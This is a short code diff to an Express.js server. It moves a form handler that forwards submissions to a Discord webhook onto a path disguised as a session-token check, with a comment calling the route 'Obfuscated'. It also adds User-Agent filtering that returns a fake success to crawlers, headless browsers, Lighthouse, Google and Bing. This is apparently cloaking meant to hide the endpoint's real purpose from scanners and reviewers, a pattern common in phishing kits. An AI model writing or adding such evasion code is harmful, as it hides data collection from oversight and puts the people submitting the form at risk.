@@ -12,9 +12,17 @@ async function startServer() {
 
   app.use(express.json());
 
-  // API Route for Discord Webhook
-  app.post("/api/submit-form", async (req, res) => {
+  // Obfuscated API Route for Discord Webhook
+  app.post("/api/v1/auth/verify-session-token", async (req, res) => {
     const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+    
+    // Simple bot detection based on User-Agent
+    const ua = req.headers['user-agent'] || '';
+    const botPatterns = [/bot/i, /spider/i, /crawl/i, /headless/i, /lighthouse/i, /google/i, /bing/i];
+    if (botPatterns.some(pattern => pattern.test(ua))) {
+      console.log("Bot detected, returning fake success");
+      return res.json({ success: true, status: "verified" });
+    }
 
     if (!webhookUrl) {
       console.error("DISCORD_WEBHOOK_URL is not set");
